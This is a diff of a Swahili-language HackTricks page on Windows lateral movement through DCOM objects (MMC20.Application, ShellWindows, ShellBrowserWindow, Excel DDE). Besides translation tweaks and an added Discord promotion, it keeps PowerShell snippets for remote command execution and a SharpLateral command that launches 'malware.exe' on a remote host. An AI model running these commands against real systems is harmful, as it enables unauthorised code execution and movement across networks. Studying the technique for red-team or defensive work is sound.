@@ -4,26 +4,34 @@
 
 <summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikionyeshwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..
+* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..
 
 </details>
+
+**Kikundi cha Usalama cha Try Hard**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
 
 ## MMC20.Application
 
 **Kwa habari zaidi kuhusu mbinu hii angalia chapisho la asili kutoka [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**
 
 
-Modeli ya Vitu vya Mfano wa Vitengo vilivyosambazwa (DCOM) hutoa uwezo wa kuvutia kwa mwingiliano wa mtandao na vitu. Microsoft hutoa nyaraka kamili kwa DCOM na Modeli ya Vitengo vya Mfano (COM), inayopatikana [hapa kwa DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) na [hapa kwa COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Orodha ya programu za DCOM inaweza kupatikana kwa kutumia amri ya PowerShell:
+Modeli ya Vitu vya Mfano wa Sehemu iliyosambazwa (DCOM) inatoa uwezo wa kuvutia kwa mwingiliano wa mtandao na vitu. Microsoft hutoa nyaraka kamili kwa DCOM na Modeli ya Vitu vya Sehemu (COM), inayopatikana [hapa kwa DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) na [hapa kwa COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Orodha ya programu za DCOM inaweza kupatikana kwa kutumia amri ya PowerShell:
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
-COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), inawezesha uandishi wa hatua za MMC snap-in kwa kutumia script. Kwa umuhimu, kipengele hiki kina njia ya `ExecuteShellCommand` chini ya `Document.ActiveView`. Taarifa zaidi kuhusu njia hii inaweza kupatikana [hapa](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Angalia ikifanya kazi:
+COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), inawezesha uandishi wa hatua za MMC snap-in. Kwa umuhimu, kipengele hiki kina njia ya `ExecuteShellCommand` chini ya `Document.ActiveView`. Taarifa zaidi kuhusu njia hii zinaweza kupatikana [hapa](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Angalia ikifanya kazi:
 
-Kipengele hiki kinawezesha utekelezaji wa amri kupitia mtandao kupitia programu ya DCOM. Ili kuingiliana na DCOM kijijini kama msimamizi, PowerShell inaweza kutumika kama ifuatavyo:
+Kipengele hiki kinarahisisha utekelezaji wa amri juu ya mtandao kupitia programu ya DCOM. Ili kuingiliana na DCOM kijijini kama msimamizi, PowerShell inaweza kutumika kama ifuatavyo:
 ```powershell
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
@@ -45,16 +53,16 @@ ls \\10.10.10.10\c$\Users
 ```
 ## ShellWindows & ShellBrowserWindow
 
-**Kwa habari zaidi kuhusu hii mbinu angalia chapisho la asili [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
+**Kwa habari zaidi kuhusu hii technique angalia chapisho la asili [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
 
 Kitu cha **MMC20.Application** kiligunduliwa kukosa "LaunchPermissions" wazi, kikiruhusu upatikanaji wa Wasimamizi kwa chaguo-msingi. Kwa maelezo zaidi, mjadala unaweza kuchunguzwa [hapa](https://twitter.com/tiraniddo/status/817532039771525120), na matumizi ya [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET kwa kuchuja vitu bila ruhusa wazi ya Kuzindua inapendekezwa.
 
-Vitu viwili maalum, `ShellBrowserWindow` na `ShellWindows`, vilisisitizwa kutokana na kukosa kwa ruhusa wazi ya Kuzindua. Kutokuwepo kwa kuingia kwa usajili wa `LaunchPermission` chini ya `HKCR:\AppID\{guid}` kunamaanisha hakuna ruhusa wazi.
+Vitu viwili maalum, `ShellBrowserWindow` na `ShellWindows`, vilisisitizwa kutokana na kukosa kwa Ruhusa wazi ya Kuzindua. Kutokuwepo kwa kuingia kwa usajili wa `LaunchPermission` chini ya `HKCR:\AppID\{guid}` kunamaanisha hakuna ruhusa wazi.
 
 ###  ShellWindows
-Kwa `ShellWindows`, ambayo haina ProgID, njia za .NET `Type.GetTypeFromCLSID` na `Activator.CreateInstance` hurahisisha uundaji wa vitu kwa kutumia AppID yake. Mchakato huu unatumia OleView .NET kuchukua CLSID kwa `ShellWindows`. Mara baada ya kuundwa, mwingiliano unawezekana kupitia njia ya `WindowsShell.Item`, ikiongoza kwa wito wa njia kama `Document.Application.ShellExecute`.
+Kwa `ShellWindows`, ambayo haina ProgID, njia za .NET `Type.GetTypeFromCLSID` na `Activator.CreateInstance` hurahisisha uundaji wa vitu kwa kutumia AppID yake. Mchakato huu unatumia OleView .NET kupata CLSID kwa `ShellWindows`. Mara baada ya kuundwa, mwingiliano unawezekana kupitia njia ya `WindowsShell.Item`, ikiongoza kwa wito wa njia kama `Document.Application.ShellExecute`.
 
-Amri za PowerShell za mfano zilitolewa kwa ajili ya kuunda kipengee na kutekeleza amri kijijini:
+Amri za PowerShell za mfano zilitolewa kwa kusababisha kitu na kutekeleza amri kijijini:
 ```powershell
 $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
 $obj = [System.Activator]::CreateInstance($com)
@@ -90,11 +98,11 @@ $Obj.DDEInitiate("cmd", "/c $Command")
 ```
 ### Zana za Kiotomatiki kwa Harakati za Upande
 
-Zana mbili zimebainishwa kwa ajili ya kiotomatiki hizi mbinu:
+Zana mbili zinaonyeshwa kwa kiotomatiki hizi mbinu:
 
-- **Invoke-DCOM.ps1**: Skripti ya PowerShell iliyotolewa na mradi wa Empire ambayo inasaidia kwa kiasi kikubwa wito wa njia tofauti za kutekeleza namna ya kificho kwenye mashine za mbali. Skripti hii inapatikana kwenye hazina ya GitHub ya Empire.
+- **Invoke-DCOM.ps1**: Skripti ya PowerShell iliyotolewa na mradi wa Empire ambayo inasaidia kuita njia tofauti za kutekeleza nambari kwenye mashine za mbali. Skripti hii inapatikana kwenye hazina ya GitHub ya Empire.
 
-- **SharpLateral**: Zana iliyoundwa kwa ajili ya kutekeleza kificho kijijini, ambayo inaweza kutumika kwa amri:
+- **SharpLateral**: Zana iliyoundwa kwa ajili ya kutekeleza nambari kijijini, ambayo inaweza kutumika kwa amri:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
@@ -110,16 +118,22 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 * [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
 * [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
 
+**Kikundi cha Usalama cha Try Hard**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
-<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJISAJILI**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
